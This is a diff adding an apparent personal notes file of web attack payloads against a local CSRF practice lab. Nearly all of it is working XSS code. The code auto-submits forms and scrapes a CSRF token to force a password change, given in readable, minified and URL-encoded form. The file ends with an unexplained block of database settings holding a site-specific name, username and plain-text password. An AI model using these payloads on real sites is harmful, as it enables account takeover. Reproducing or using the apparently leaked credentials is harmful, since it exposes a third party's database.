@@ -1,0 +1,59 @@
+<script>
+document.forms[0].elements[0].value = 'x';
+document.forms[0].elements[1].value = 'x';
+document.forms[0].elements[3].click();
+</script>
+<script>document.forms[0].elements[0].value = 'x';document.forms[0].elements[1].value = 'x';document.forms[0].elements[3].click();</script>
+
+http://localhost/labs/csrf/04.php?fn=<script>document.forms[0].elements[0].value = 'x';document.forms[0].elements[1].value = 'x';document.forms[0].elements[3].click();</script>
+&btn_send=1
+
+
+token:
+	2 xhr
+		1 - get change_pwd.php
+			1-1 - token -> save var
+		2 - post -> change password
+				pass1=hacker
+				pass2=hacker
+				token=var
+		
+		
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+	if (this.readyState == 4 && this.status == 200)
+	{
+		var token = this.responseText.match(/<input type="hidden" name="csrf_token" value=(.*)/gm)[0].trim().split('"')[5];
+		var xhr = new XMLHttpRequest();
+		var params = 'pass1=php&pass2=php&csrf_token='+token+'&btn_save=1';
+		xhr.open("POST", "http://localhost/labs/csrf/05.php", true);
+		xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+		xhr.send(params);
+
+	}
+};
+xhttp.open("GET", "http://localhost/labs/csrf/05.php", true);
+xhttp.send();
+		
+		
+<script>var xhttp=new XMLHttpRequest;xhttp.onreadystatechange=function(){if(4==this.readyState&&200==this.status){var t=this.responseText.match(/<input type="hidden" name="csrf_token" value=(.*)/gm)[0].trim().split('"')[5],e=new XMLHttpRequest,s="pass1=php&pass2=php&csrf_token="+t+"&btn_save=1";e.open("POST","http://localhost/labs/csrf/05.php",!0),e.setRequestHeader("Content-type","application/x-www-form-urlencoded"),e.send(s)}},xhttp.open("GET","http://localhost/labs/csrf/05.php",!0),xhttp.send();</script>		
+		
+		
+http://localhost/labs/csrf/05-xss.php?fn=%3Cscript%3Evar+xhttp%3Dnew+XMLHttpRequest%3Bxhttp.onreadystatechange%3Dfunction%28%29%7Bif%284%3D%3Dthis.readyState%26%26200%3D%3Dthis.status%29%7Bvar+t%3Dthis.responseText.match%28%2F%3Cinput+type%3D%22hidden%22+name%3D%22csrf_token%22+value%3D%28.*%29%2Fgm%29%5B0%5D.trim%28%29.split%28%27%22%27%29%5B5%5D%2Ce%3Dnew+XMLHttpRequest%2Cs%3D%22pass1%3Dphp%26pass2%3Dphp%26csrf_token%3D%22%2Bt%2B%22%26btn_save%3D1%22%3Be.open%28%22POST%22%2C%22http%3A%2F%2Flocalhost%2Flabs%2Fcsrf%2F05.php%22%2C%210%29%2Ce.setRequestHeader%28%22Content-type%22%2C%22application%2Fx-www-form-urlencoded%22%29%2Ce.send%28s%29%7D%7D%2Cxhttp.open%28%22GET%22%2C%22http%3A%2F%2Flocalhost%2Flabs%2Fcsrf%2F05.php%22%2C%210%29%2Cxhttp.send%28%29%3B%3C%2Fscript%3E&btn_send=1		
+		
+		
+define('DB_NAME', 'icanstud_mainsite');
+
+/** MySQL database username */
+define('DB_USER', 'icanstud_mainsit');
+
+/** MySQL database password */
+define('DB_PASSWORD', '=qgruW1uVx$5');
+
+		
+		
+		
+		
+		
+		
+		
